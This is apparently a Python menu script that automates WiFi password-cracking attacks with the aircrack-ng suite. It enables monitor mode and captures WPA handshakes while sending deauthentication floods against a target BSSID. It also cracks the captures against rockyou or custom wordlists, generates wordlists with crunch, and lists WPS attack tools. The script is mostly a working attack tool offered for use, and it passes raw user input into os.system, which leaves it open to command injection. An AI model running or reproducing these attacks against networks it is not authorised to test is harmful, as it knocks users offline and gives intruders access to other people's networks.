
import os
from cracker import *
import subprocess

def choice2():
        print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
        interface = input("")
        order = "airmon-ng stop {} && service network-manager restart".format(interface)
        geny  = os.system(order)
        

def choice3():
        print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
        interface = input("")
        order = "airodump-ng {} -M".format(interface)
        print("When Done Press CTRL+c")
        cmd = os.system("sleep 3")
        geny  = os.system(order)
        cmd = os.system("sleep 10")
       

def choice0():
        
        print("""

Author - Mmabiaa
Socials:
    https://www.github.com/mmabiaa/
    https://www.x.com/mmabiaa/

Email: isbbydior@gmail.com
Contact: +233 599 670 295

""")
        quit()

def choice4():
        print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
        interface = input("")
        order     = "airodump-ng {} -M".format(interface)
        print("\nWhen Done Press CTRL+c")
        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
        print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
        print("\nyou Can use 's' to arrange networks")
        cmd       = os.system("sleep 7")
        geny      = os.system(order)
        print("\nEnter the bssid of the target?")
        bssid     = str(input(""))
        print("\nEnter the channel of the network?")
        channel   = int(input())
        print("Enter the path of the output file ?")
        path = str(input(""))
        print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
        print("the number of the packets Depends on the Distance Between you and the network")
        dist = int(input(""))
        order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
        geny = os.system(order)
      



def choice6():
        if  os.path.exists("/usr/share/wordlists/rockyou.txt")==True:
            print("\nEnter the path of the handshake file ?")
            path = str(input(""))
            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C")
            geny  = os.system(order)
            sleep = os.system("sleep 5d")
            exit()
        elif os.path.exists("/usr/share/wordlists/rockyou.txt")==False:
            cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            print("\nEnter the path of the handshake file ?")
            path = str(input(""))
            order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C")
            geny  = os.system(order)
            sleep = os.system("sleep 5d")
            exit()


def choice7():
        print("\nEnter the path of the handshake file ?")
        path = str(input(""))
        print("\nEnter the path of the wordlist ?")
        wordlist = str(input(""))
        order = ("aircrack-ng {} -w {}").format(path,wordlist)
        geny = os.system(order)
        exit()


def choice8():
        print("\nEnter the essid of the network ?(Be careful when you type it and use 'the name of the network') ")
        essid = str(input(""))
        print("\nEnter the path of the handshake file ?")
        path = str(input(""))
        print("\nEnter the minimum length of the password (8/64)?")
        mini = int(input(""))
        print("\nEnter the maximum length of the password (8/64)?")
        max  = int(input(""))
        print("""
---------------------------------------------------------------------------------------
(1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
(2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
(3)  Numeric chars                                   (0123456789)
(4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
(5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
(6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
(7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
(9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
(10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
(11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
(12) Your Own Words and numbers
-----------------------------------------------------------------------------------------
Crack Password Could Take Hours,Days,Weeks,Months to complete
and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
may reach to Hundreds of TeRa Bits so Be patiant
""")
        check_password(mini,path,essid)


def choice9():
        print("\nEnter the minimum length of the password (8/64)?")
        mini = int(input(""))
        print("\nEnter the maximum length of the password (8/64)?")
        max  = int(input(""))
        print("\nEnter the path of the output file?")
        path = str(input(""))
        print("\nEnter what you want the password contain ?")
        password = str(input(""))
        order = ("crunch {} {} {} -o {}").format(mini,max,password,path)
        geny = os.system(order)
        a = ("The wordlist in >>>>> {} Named as SRART").format(path)
        print(a)



def choice10():
    cmd = os.system("clear")
    print("""
1)Reaver
2)Bully
3)wifite (Recommeneded)
4)PixieWps

0) Back to Main Menu
""")
    check_attack()


def choice11():
        print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
        interface = str(input(""))
        order = "airodump-ng -M --wps {}".format(interface)
        geny = os.system(order)
        cmd = os.system("sleep 5 ")
      


def choice1():
        print("\nEnter the interface:(Default(wlan0/wlan1))")
        interface = input("")
        order = "airmon-ng start {} && airmon-ng check kill".format(interface)
        geny  = os.system(order)

